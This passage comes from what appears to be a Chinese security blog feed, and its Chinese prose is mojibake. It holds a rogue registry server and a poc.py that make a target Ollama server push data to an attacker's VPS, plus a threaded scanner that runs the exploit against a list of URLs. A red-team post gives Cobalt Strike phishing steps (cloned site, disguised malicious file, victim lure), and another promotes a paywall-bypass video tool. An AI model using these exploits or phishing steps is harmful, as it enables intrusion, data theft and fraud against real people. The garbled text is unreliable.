fake_upload_post(callback_data: Request, response: Response):</span><br><span class="line">    print(await callback_data.body())</span><br><span class="line">    response.headers[&quot;Docker-Upload-Uuid&quot;] = &quot;3647298c-9588-4dd2-9bbe-0539533d2d04&quot;</span><br><span class="line">    response.headers[&quot;Location&quot;] = f&quot;http://&#123;HOST&#125;/v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04?_state=eBQ2_sxwOJVy8DZMYYZ8wA8NBrJjmdINFUMM6uEZyYF7Ik5hbWUiOiJyb2d1ZS9sbGFtYTMiLCJVVUlEIjoiMzY0NzI5OGMtOTU4OC00ZGQyLTliYmUtMDUzOTUzM2QyZDA0IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDI0LTA2LTI1VDEzOjAxOjExLjU5MTkyMzgxMVoifQ%3D%3D&quot;</span><br><span class="line">    return &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">@app.patch(&quot;/v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04&quot;, status_code=202)</span><br><span class="line">async def fake_patch_file(callback_data: Request):</span><br><span class="line">    print(&#x27;patch&#x27;)</span><br><span class="line">    print(await callback_data.body())</span><br><span class="line">    return &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">@app.post(&quot;/v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04&quot;, status_code=202)</span><br><span class="line">async def fake_post_file(callback_data: Request):</span><br><span class="line">    print(await callback_data.body())</span><br><span class="line">    return &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">@app.put(&quot;/v2/rogue/bi0x/manifests/latest&quot;)</span><br><span class="line">async def fake_manifests_put(callback_data: Request, response: Response):</span><br><span class="line">    print(await callback_data.body())</span><br><span class="line">    response.headers[&quot;Docker-Upload-Uuid&quot;] = &quot;3647298c-9588-4dd2-9bbe-0539533d2d04&quot;</span><br><span class="line">    response.headers[&quot;Location&quot;] = f&quot;http://&#123;HOST&#125;/v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04?_state=eBQ2_sxwOJVy8DZMYYZ8wA8NBrJjmdINFUMM6uEZyYF7Ik5hbWUiOiJyb2d1ZS9sbGFtYTMiLCJVVUlEIjoiMzY0NzI5OGMtOTU4OC00ZGQyLTliYmUtMDUzOTUzM2QyZDA0IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDI0LTA2LTI1VDEzOjAxOjExLjU5MTkyMzgxMVoifQ%3D%3D&quot;</span><br><span class="line">    return &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    import uvicorn</span><br><span class="line">    uvicorn.run(app, host=&#x27;0.0.0.0&#x27;, port=80)</span><br></pre></td></tr></table></figure><h2 id="3ã€ç¬¬ä¸‰æ­¥ï¼šæ‰§è¡Œæ¶æ„æ”»å‡»"><a href="#3ã€ç¬¬ä¸‰æ­¥ï¼šæ‰§è¡Œæ¶æ„æ”»å‡»" class="headerlink" title="3ã€ç¬¬ä¸‰æ­¥ï¼šæ‰§è¡Œæ¶æ„æ”»å‡»"></a>3ã€ç¬¬ä¸‰æ­¥ï¼šæ‰§è¡Œæ¶æ„æ”»å‡»</h2><p>è¿è¡Œå¦‚ä¸‹poc.py è„šæœ¬ï¼Œvps ä¸ä¸Šé¢vpsçš„IPä¿æŒä¸€è‡´ï¼Œtarget_url æ˜¯è¦æ”»å‡»çš„ollamaæœåŠ¡å™¨åœ°å€ã€‚æ³¨æ„ï¼švps ä¸ target_url æœ€å¥½ä¸è¦æ”¾ç½®åœ¨åŒä¸€ä¸ªæœåŠ¡å™¨ä¸Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">HOST = &quot;vps&quot;</span><br><span class="line">target_url = &quot;http://target_url&quot;</span><br><span class="line"></span><br><span class="line">vuln_registry_url = &quot;vps/rogue/bi0x&quot;</span><br><span class="line"></span><br><span class="line">pull_url = f&quot;&#123;target_url&#125;/api/pull&quot;</span><br><span class="line">push_url = f&quot;&#123;target_url&#125;/api/push&quot;</span><br><span class="line"></span><br><span class="line">requests.post(pull_url, json=&#123;&quot;name&quot;: vuln_registry_url, &quot;insecure&quot;: True&#125;)</span><br><span class="line">requests.post(push_url, json=&#123;&quot;name&quot;: vuln_registry_url, &quot;insecure&quot;: True&#125;)</span><br><span class="line"></span><br><span class="line"># see rogue server log</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¹‹åï¼Œçœ‹server.py çš„æ‰§è¡Œç»“æœ</p><h1 id="äº”ã€æ¼æ´æ‰¹é‡æ£€æµ‹"><a href="#äº”ã€æ¼æ´æ‰¹é‡æ£€æµ‹" class="headerlink" title="äº”ã€æ¼æ´æ‰¹é‡æ£€æµ‹"></a>äº”ã€æ¼æ´æ‰¹é‡æ£€æµ‹</h1><p>1ã€server.py åŸæ ·ä¸å˜ï¼Œä¿æŒæ‰§è¡Œ</p><p>2ã€å°†éœ€è¦æ£€æµ‹çš„urlæ”¾ç½®åœ¨urls.txt æ–‡ä»¶ä¸­ï¼Œæ³¨æ„åŠ http</p><p>3ã€è¿è¡Œå¦‚ä¸‹ pocs.py è„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line">import urllib3</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"># è¯»å–URLçš„æ–‡æœ¬æ–‡ä»¶å</span><br><span class="line">urls_file = &quot;urls.txt&quot;</span><br><span class="line"></span><br><span class="line"># ä¸»æœºåå’Œæ¼æ´æ³¨å†ŒURL</span><br><span class="line">HOST = &quot;vps&quot;</span><br><span class="line">vuln_registry_url = f&quot;&#123;HOST&#125;/rogue/bi0x&quot;</span><br><span class="line"></span><br><span class="line">proxys = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print_lock = threading.Lock()  # åˆ›å»ºä¸€ä¸ªé”å¯¹è±¡</span><br><span class="line"></span><br><span class="line">def readtxt():</span><br><span class="line">    lines = []</span><br><span class="line"></span><br><span class="line">    with open(urls_file, &#x27;r&#x27;) as f:</span><br><span class="line">        # è¯»å–æ‰€æœ‰è¡Œå†…å®¹ï¼Œå¹¶å»é™¤å·¦å³ç©ºç™½</span><br><span class="line">        for line in f.readlines():</span><br><span class="line">            # åˆ¤æ–­æœ€åæ˜¯ä¸æ˜¯/ï¼Œè‹¥æ˜¯åˆ™å»é™¤</span><br><span class="line">            if line.endswith(&#x27;/&#x27;):</span><br><span class="line">                line = line[:-1]</span><br><span class="line"></span><br><span class="line">            # åˆ¤æ–­lineå‰é¢æœ‰æ²¡æœ‰http</span><br><span class="line">            if not line.startswith(&#x27;http&#x27;):</span><br><span class="line">                # å¦‚æœæ²¡æœ‰ï¼Œåˆ™æ·»åŠ http://</span><br><span class="line">                line1 = &#x27;http://&#x27; + line</span><br><span class="line">                line2 = &#x27;https://&#x27; + line</span><br><span class="line">                lines.append(line1.strip())</span><br><span class="line">                lines.append(line2.strip())</span><br><span class="line">            else:</span><br><span class="line">                lines.append(line.strip())</span><br><span class="line">    return lines</span><br><span class="line"></span><br><span class="line">def check_vulnerability(line):</span><br><span class="line">    # ç›®æ ‡URL</span><br><span class="line">    target_url = line</span><br><span class="line"></span><br><span class="line">    # æ„å»ºAPIç«¯ç‚¹URL</span><br><span class="line">    pull_url = f&quot;&#123;target_url&#125;/api/pull&quot;</span><br><span class="line">    push_url = f&quot;&#123;target_url&#125;/api/push&quot;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        # å‘é€POSTè¯·æ±‚</span><br><span class="line">        response_pull = requests.post(pull_url, proxies=proxys, json=&#123;&quot;name&quot;: vuln_registry_url, &quot;insecure&quot;: True&#125;)</span><br><span class="line">        response_push = requests.post(push_url, proxies=proxys, json=&#123;&quot;name&quot;: vuln_registry_url, &quot;insecure&quot;: True&#125;)</span><br><span class="line"></span><br><span class="line">        if response_pull.status_code == 200 and response_push.status_code == 200:</span><br><span class="line">            with print_lock:</span><br><span class="line">                with open(&quot;resutls.txt&quot;, &quot;a&quot;) as f:</span><br><span class="line">                    f.write(f&quot;&#123;target_url&#125;\n&quot;)</span><br><span class="line">                    # è¿›è¡Œçº¢è‰²è¾“å‡º</span><br><span class="line">                    print(&quot;\033[31m&quot; + f&quot;[+] &#123;target_url&#125; å¯èƒ½å­˜åœ¨æ¼æ´(å…·ä½“çœ‹serveræ—¥å¿—)&quot; + &quot;\033[0m&quot;)</span><br><span class="line">        else:</span><br><span class="line">            with print_lock:</span><br><span class="line">                print(f&quot;[-] &#123;target_url&#125; ä¸å­˜åœ¨æ¼æ´&quot;)</span><br><span class="line"></span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        with print_lock:</span><br><span class="line">            print(f&#x27;[-] è¿æ¥é”™è¯¯ï¼Œéœ€è¦é…ç½®ä»£ç†: &#123;target_url&#125;&#x27;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        with print_lock:</span><br><span class="line">            print(f&#x27;[-] å…¶ä»–é”™è¯¯: &#123;target_url&#125;&#x27;)</span><br><span class="line">def main():</span><br><span class="line">    lines = readtxt()</span><br><span class="line"></span><br><span class="line">    with ThreadPoolExecutor(max_workers=10) as executor:</span><br><span class="line">        for line in lines:</span><br><span class="line">            executor.submit(check_vulnerability, line)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>ç»“æœå°†ä¼šä¿å­˜åœ¨results.txt æ–‡ä»¶ä¸­</p>]]></content>
      
      
      <categories>
          
          <category> å¤ç°ä¸å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ollama </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€çº¢é˜Ÿå…¥ä¾µã€‘CSæ°´å‘é’“é±¼æ”»å‡»è‡ªåŠ¨æ”¶æ†</title>
      <link href="/2025/02/04/Red-Team-Invasion-CS-fishing/"/>
      <url>/2025/02/04/Red-Team-Invasion-CS-fishing/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€CSé…ç½®é’“é±¼ç½‘ç«™"><a href="#ä¸€ã€CSé…ç½®é’“é±¼ç½‘ç«™" class="headerlink" title="ä¸€ã€CSé…ç½®é’“é±¼ç½‘ç«™"></a>ä¸€ã€CSé…ç½®é’“é±¼ç½‘ç«™</h1><p>1ã€å¼€å¯ä¸€ä¸ªåå­—å«åšCDNçš„ç›‘å¬</p><p><img src="/img/Red-Team-Invasion-CS-fishing/image-20250204193141276.png" alt="image-20250204193141276"></p><p>2ã€é…ç½®ç½‘ç«™å…‹éš†å’Œæ¶æ„æ–‡ä»¶æ‰˜ç®¡ç«™ç‚¹</p><p><img src="/img/Red-Team-Invasion-CS-fishing/image-20250204193307088.png" alt="image-20250204193307088"></p><p>æ¶æ„æ–‡ä»¶å¯ä»¥åšå…æ€å’ŒRLOæ„é€ å¤„ç†ï¼Œä½¿æ•ˆæœæ›´é€¼çœŸ</p><h1 id="äºŒã€CSFishé…ç½®"><a href="#äºŒã€CSFishé…ç½®" class="headerlink" title="äºŒã€CSFishé…ç½®"></a>äºŒã€CSFishé…ç½®</h1><p>ç”¨åˆ°CSFishè¿™æ¬¾å·¥å…·ï¼Œåœ°å€ï¼š<a href="https://github.com/Lusensec/CSFish">Lusensec&#x2F;CSFish: é¡¹ç›®ç”¨äºå®ç°æ°´å‘é’“é±¼æ”¶æ†&amp;CSä¸Šçº¿æé†’&amp;è‡ªåŠ¨æƒé™ç»´æŒ</a></p><p>1ã€å¼€æ”¾åœ¨CSåŒæœåŠ¡å™¨çš„apacheæœåŠ¡å™¨ï¼Œéœ€è¦è¿è¡Œphpæ–‡ä»¶</p><p><img src="/img/Red-Team-Invasion-CS-fishing/image-20250204193454062.png" alt="image-20250204193454062"></p><p>2ã€ä¿®æ”¹CSFishé…ç½®ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ä¿®æ”¹CSFish.cnaç¬¬4è¡Œä»£ç ä¸ºä½ è¦è¿ç§»çš„è¿›ç¨‹åï¼Œæ­¤å¤„é»˜è®¤ä¸ºexplorer.exe</span><br><span class="line">ä¿®æ”¹CSFish.cnaç¬¬5è¡Œä»£ç ä¸ºè‡ªå·±CSç›‘å¬å™¨åç§°</span><br><span class="line">ä¿®æ”¹CSFish.cnaç¬¬40è¡Œä»£ç ä¸ºè‡ªå·±PHPæœåŠ¡å™¨åœ°å€</span><br><span class="line">ä¿®æ”¹fish.phpç¬¬3è¡Œä»£ç ä¸ºè‡ªå·±é’“é±¼é¡µé¢åœ°å€</span><br><span class="line">ä¿®æ”¹fish.phpç¬¬64æˆ–ç¬¬71è¡Œä»£ç ä¸ºè‡ªå·±é£ä¹¦æˆ–è€…é’‰é’‰çš„webhookåœ°å€ï¼ˆä¸¤ä¸ªå¡«ä¸€ä¸ªå³å¯ï¼Œæ¨èä½¿ç”¨é£ä¹¦ï¼‰</span><br></pre></td></tr></table></figure><p>3ã€é€šè¿‡çŸ­é“¾æ¥æˆ–åŸŸåä¼ªè£…apacheæœåŠ¡åœ°å€å‘è‡³å—å®³äººå³å¯</p>]]></content>
      
      
      <categories>
          
          <category> çº¢é˜Ÿå…¥ä¾µ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ°´å‘é’“é±¼ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Pythonæ­¦å™¨åº“ã€‘VIPè§†é¢‘å…è´¹è§‚çœ‹</title>
      <link href="/2025/01/03/Python-Video-cracking/"/>
      <url>/2025/01/03/Python-Video-cracking/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€æ•ˆæœ"><a href="#ä¸€ã€æ•ˆæœ" class="headerlink" title="ä¸€ã€æ•ˆæœ"></a>ä¸€ã€æ•ˆæœ</h1><p>æ”¾å…¥è…¾è®¯è§†é¢‘ã€çˆ±å¥‡è‰ºä¸­çš„vipçš„è§†é¢‘é“¾æ¥</p><p><img src="/img/Python-Video-cracking/image-20250103170745950.png" alt="image-20250103170745950"></p><p>è¿›è¡Œæ’­æ”¾ï¼Œåˆ™ç»•è¿‡vipç›´æ¥è§‚çœ‹</p><p><img src="/img/Python-Video-cracking/image-20250103170951153.png" alt="image-20250103170951153"></p><h1 id="äºŒã€ä¸‹è½½"><a href="#äºŒã€ä¸‹è½½" class="headerlink" title="äºŒã€ä¸‹è½½"></a>äºŒã€ä¸‹è½½</h1><p>å†…éƒ¨è®ºå›è·å–ä¸‹è½½é“¾æ¥æˆ–ç•™è¨€è·å–</p>]]></content>
      
      
      <categories>
          
          <category> Pythonæ­¦å™¨åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pythonæ­¦å™¨åº“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Pythonæ­¦å™¨åº“ã€‘ç»¼åˆæˆé•¿å‹å·¥å…·ç®±-Comprehensive_Growth_Toolbox</title>
      <link href="/2024/11/29/Python-Comprehensive-Growth-Toolbox/"/>
      <url>/2024/11/29/Python-Comprehensive-Growth-Toolbox/</url>
      
        <content type="html"><![CDATA[<h1 id="ç»¼åˆæˆé•¿å‹å·¥å…·ç®±"><a href="#ç»¼åˆæˆé•¿å‹å·¥å…·ç®±" class="headerlink" title="ç»¼åˆæˆé•¿å‹å·¥å…·ç®±"></a>ç»¼åˆæˆé•¿å‹å·¥å…·ç®±</h1><p>GitHubåœ°å€ï¼š<a href="https://github.com/Lusensec/Comprehensive_Growth_Toolbox">Lusensec&#x2F;Comprehensive_Growth_Toolbox: ç»¼åˆæˆé•¿å‹å·¥å…·ç®± (github.com)</a></p><p>æ›´æ–°æ–¹æ³•ï¼šä¸‹è½½æˆ–è€…å…‹éš†é¡¹ç›®åï¼Œç›´æ¥è¦†ç›–åŸæœ‰é¡¹ç›®å³å¯ã€‚æ¯æ¬¡æ›´æ–°åªä¼šä¿®æ”¹é…ç½®ä»£ç ï¼Œä¸ä¼šå¯¹å·²æœ‰å·¥å…·ç­‰é…ç½®é¡¹å‘ç”Ÿå†²çª</p><h1 id="ä¸€ã€å·¥å…·ç®±ç®€ä»‹"><a href="#ä¸€ã€å·¥å…·ç®±ç®€ä»‹" class="headerlink" title="ä¸€ã€å·¥å…·ç®±ç®€ä»‹"></a>ä¸€ã€å·¥å…·ç®±ç®€ä»‹</h1><p>ä¸€ã€ç”±äºä»å­¦ä¹ åˆ°å®è·µçš„è¿‡ç¨‹ä¸­ä¼šä¸æ–­æ”¶é›†å„ç§å·¥å…·ï¼Œå¯¹è¿™äº›å·¥å…·åšå¥½åˆ†ç±»æ±‡æ€»ï¼Œæ˜¯ä¸€ä»¶ç¹çä¸”æœ‰å¿…è¦çš„ã€‚å¼€å‘è¿™ä¸ªå·¥å…·ç®±çš„ç›®çš„ï¼Œå°±æ˜¯è®©ç”¨æˆ·å¯¹å·¥å…·å˜çš„æ›´åŠ è¶æ‰‹å’Œæ·±å…¥åº”ç”¨ï¼Œè¿›è€Œæ‰“é€ å±äºè‡ªå·±ç‹¬æœ‰çš„å·¥å…·ç®±ã€‚</p><p>äºŒã€å·¥å…·ç®±å…·å¤‡å¼ºå¤§çš„å¤šç§ç¯å¢ƒåº”å¯¹èƒ½åŠ›ã€‚åœ¨é¢å¯¹ Windowsã€Linux ç­‰ä»¥åŠçº¢é˜Ÿã€è“é˜Ÿç­‰ä¸åŒçš„ç¯å¢ƒä¸‹ä¾ç„¶èƒ½å¤Ÿè®©ç”¨æˆ·æœ‰è¶æ‰‹çš„å·¥å…·å¯ç”¨ï¼Œå¿«é€Ÿä¸Šæ‰‹å·¥ä½œã€‚</p><p>ä¸‰ã€é¢å¯¹å¤šç§å·¥å…·çš„å„ç§æƒ…å†µã€‚å·¥å…·ç®±æ ¹æ®å·¥å…·çš„ç»å¯¹è·¯å¾„ã€ç›¸å¯¹è·¯å¾„ä»¥åŠæœªå®‰è£… ç­‰æƒ…å†µåšäº†ä¸åŒçš„å¤„ç†ä»¥é€‚åº”å„ç§æƒ…å†µã€‚</p><h1 id="äºŒã€å·¥å…·ç®±åŸºæœ¬ä½¿ç”¨"><a href="#äºŒã€å·¥å…·ç®±åŸºæœ¬ä½¿ç”¨" class="headerlink" title="äºŒã€å·¥å…·ç®±åŸºæœ¬ä½¿ç”¨"></a>äºŒã€å·¥å…·ç®±åŸºæœ¬ä½¿ç”¨</h1><h2 id="1ã€è‡ªå®šä¹‰èœå•æ "><a href="#1ã€è‡ªå®šä¹‰èœå•æ " class="headerlink" title="1ã€è‡ªå®šä¹‰èœå•æ "></a>1ã€è‡ªå®šä¹‰èœå•æ </h2><p>è‡ªä¸»æ·»åŠ èœå•æ ï¼Œè®¾ç½®å·¥å…·åˆ†ç±»</p><p><img src="/img/Python-Comprehensive-Growth-Toolbox/menu.png" alt="img.png"></p><p>è¿™é‡Œçš„<code>å¯¹åº”æ–‡ä»¶å¤¹</code>æ˜¯æ–¹ä¾¿ç›¸å¯¹å·¥å…·çš„ä½¿ç”¨è€Œè®¾ç½®ï¼Œå°½é‡è®¾ç½®æˆè‹±æ–‡åç§°ï¼Œé˜²æ­¢å·¥å…·ä½¿ç”¨å‡ºé”™ã€‚åœ¨åé¢çš„ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œéœ€è¦æŠŠè¿™ä¸ªèœå•æ å¯¹åº”çš„å·¥å…·æ”¾ç½®åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ç›®å½•ä¸‹ã€‚é¢œè‰²é£æ ¼åŒºåˆ†ä¸åŒçš„èœå•æ </p><h2 id="2ã€è‡ªå®šä¹‰å¯¼èˆªæ "><a href="#2ã€è‡ªå®šä¹‰å¯¼èˆªæ " class="headerlink" title="2ã€è‡ªå®šä¹‰å¯¼èˆªæ "></a>2ã€è‡ªå®šä¹‰å¯¼èˆªæ </h2><p>è‡ªä¸»æ·»åŠ å¯¼èˆªæ ï¼Œå¯¹å·¥å…·çš„ä½¿ç”¨åšä¸€ä¸ªç»†åˆ†</p><p><img src="/img/Python-Comprehensive-Growth-Toolbox/navigation_bar.png" alt="navigation_bar.png"></p><p>ä»–éœ€è¦æˆ‘ä»¬åœ¨å·²æœ‰èœå•æ çš„æƒ…å†µä¸‹åšä¸€ä¸ªå¯¼èˆªæ ï¼Œæ–¹ä¾¿å¯¹å·¥å…·çš„ä½¿ç”¨åšåˆ’åˆ†</p><h2 id="3ã€è‡ªå®šä¹‰æŒ‰é’®å·¥å…·"><a href="#3ã€è‡ªå®šä¹‰æŒ‰é’®å·¥å…·" class="headerlink" title="3ã€è‡ªå®šä¹‰æŒ‰é’®å·¥å…·"></a>3ã€è‡ªå®šä¹‰æŒ‰é’®å·¥å…·</h2><p>æŒ‰é’®å·¥å…·æœ‰äº”ç§å¯åŠ¨æ–¹å¼ï¼Œå¸¸ç”¨1ã€2ã€3ç§ï¼š</p><ol><li>ç»å¯¹è·¯å¾„ï¼šé€‚ç”¨äºæœ¬æœºå·²ç»å®‰è£…ä¸”æ— æ³•ç§»åŠ¨çš„å·¥å…·</li><li>ç›¸å¯¹è·¯å¾„ï¼šåŸºäºå·¥å…·ç®±çš„ç›¸å¯¹è·¯å¾„ï¼Œæ–¹ä¾¿å¤‡ä»½æˆ–è€…èµ ä¸ä»–äºº</li><li>æ–‡ä»¶å¤¹è·¯å¾„ï¼šæ–¹ä¾¿æ‰‹åŠ¨å¯åŠ¨çš„å·¥å…·ï¼Œå¯ä»¥ç›´æ¥æ‰“å¼€å·¥å…·æ‰€å¤„çš„æ–‡ä»¶å¤¹ï¼Œä»¥ä¾¿åº”å¯¹æ›´åŠ å¤æ‚çš„æƒ…å†µ</li><li>é“¾æ¥æ‰“å¼€ï¼šæŸäº›å·¥å…·è¿è¡Œåœ¨docker æˆ–è€…å…¶ä»–è™šæ‹Ÿæœºç­‰ç½‘é¡µåœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶åœ°å€å†™å…¥ï¼Œç‚¹å‡»å³å¯ç›´æ¥ç”¨æµè§ˆå™¨æ‰“å¼€è¯¥ç½‘é¡µ</li><li>ä¸‹è½½é“¾æ¥ï¼šæ–¹ä¾¿å¤šæ•°ä¸å¸¸ç”¨çš„ä¸”å æ®å†…å­˜çš„å°å·¥å…·ï¼Œä¿å­˜ä¸‹è½½è·¯å¾„ï¼Œéšç”¨éšä¸‹è½½</li></ol><h3 id="1ã€ç›´æ¥æ‰“å¼€"><a href="#1ã€ç›´æ¥æ‰“å¼€" class="headerlink" title="1ã€ç›´æ¥æ‰“å¼€"></a>1ã€ç›´æ¥æ‰“å¼€</h3><p><img src="/img/Python-Comprehensive-Growth-Toolbox/zhijiedakai.png" alt="image-20240809142607583"></p><p>æ–¹ä¾¿exe è¿™ç§ä¸éœ€è¦å‚æ•°å³å¯åŒå‡»æ‰§è¡Œçš„å·¥å…·ã€‚<strong>ç‰¹åˆ«æ³¨æ„ï¼š</strong>batçš„åŒå‡»è„šæœ¬æ¨èä½¿ç”¨å‘½ä»¤è¡Œæ–¹å¼æ‰§è¡Œ</p><h3 id="2ã€å‘½ä»¤è¡Œæ‰“å¼€"><a href="#2ã€å‘½ä»¤è¡Œæ‰“å¼€" class="headerlink" title="2ã€å‘½ä»¤è¡Œæ‰“å¼€"></a>2ã€å‘½ä»¤è¡Œæ‰“å¼€</h3><p>åœ¨è®¾ç½®å¯åŠ¨å‘½ä»¤çš„æ—¶å€™ï¼Œéœ€è¦ç”¨ã€*ã€‘å· ä»£æ›¿å·¥å…·åœ¨å‘½ä»¤ä¸­çš„ä½ç½®ï¼Œä»¥é˜²å› è·¯å¾„é—®é¢˜è€Œå‡ºé”™ã€‚</p><p>å‘½ä»¤è¡Œæ‰“å¼€çš„åŸç†æ˜¯åˆ¤æ–­æ‰§è¡Œçš„å‘½ä»¤ä¸­æ˜¯å¦å…·æœ‰ç©ºæ ¼å­˜åœ¨ï¼Œå¦‚æœå‘½ä»¤è¡Œä¸­å­˜åœ¨ç©ºæ ¼ï¼Œåˆ™ä¼šä»¥å‘½ä»¤è¡Œçš„æ–¹å¼è¿è¡Œã€‚å› æ­¤å¦‚æœä¸€ä¸ªexeã€batå·¥å…·æ˜¯ä½¿ç”¨å‘½ä»¤æ‰§è¡Œï¼Œå¯ä½¿ç”¨ã€ *ã€‘çš„æ–¹å¼ä½¿ç”¨å‘½ä»¤è¡Œæ‰“å¼€ï¼ŒåŒæ—¶å¯ä»¥è·Ÿæ¥å‘½ä»¤å‚æ•°</p><p>ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨å‘½ä»¤è¡Œæ‰“å¼€çš„æ–¹å¼å†™æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 1ã€å¦‚dirsearch.py çš„å†™æ³•</span><br><span class="line">python * -h</span><br><span class="line"></span><br><span class="line">// 2ã€å¦‚å‘½ä»¤è¡Œæ‰“å¼€çš„exe</span><br><span class="line"> *</span><br><span class="line">// 3ã€å¦‚å‘½ä»¤è¡Œæ‰“å¼€çš„éœ€è¦åŠ å‚æ•°çš„exe</span><br><span class="line">* -h</span><br><span class="line">// 4ã€éœ€è¦åŒå‡»æ‰“å¼€çš„bat</span><br><span class="line"> *</span><br></pre></td></tr></table></figure><h3 id="3ã€å‰©ä¸‹çš„æ‰“å¼€æ–¹å¼"><a href="#3ã€å‰©ä¸‹çš„æ‰“å¼€æ–¹å¼" class="headerlink" title="3ã€å‰©ä¸‹çš„æ‰“å¼€æ–¹å¼"></a>3ã€å‰©ä¸‹çš„æ‰“å¼€æ–¹å¼</h3><ul><li>æ–‡ä»¶å¤¹æ‰“å¼€ï¼šæ‰“å¼€å·¥å…·æ‰€åœ¨çš„æ–‡ä»¶å¤¹ï¼ˆä»…é€‚ç”¨äºç»å¯¹æˆ–ç›¸å¯¹è·¯å¾„çš„å·¥å…·ï¼‰ã€‚</li><li>é“¾æ¥æ‰“å¼€ï¼Œæ˜¯é€‚ç”¨äºç½‘é¡µå·¥å…·ï¼Œæ‰“å¼€å·¥å…·æ‰€åœ¨çš„ç½‘é¡µã€‚</li><li>ä¸‹è½½é“¾æ¥ï¼Œä¼šå°†å·¥å…·ä¸‹è½½ä¸‹æ¥å†ä½¿ç”¨ã€‚æ³¨æ„ä¸‹è½½å®Œä¹‹åéœ€è¦å³é”®ä¿®æ”¹å¯åŠ¨å‘½ä»¤æ‰èƒ½è¿è¡Œæ‰“å¼€ã€‚</li></ul><h1 id="ä¸‰ã€ä¸´æ—¶ç¬”è®°"><a href="#ä¸‰ã€ä¸´æ—¶ç¬”è®°" class="headerlink" 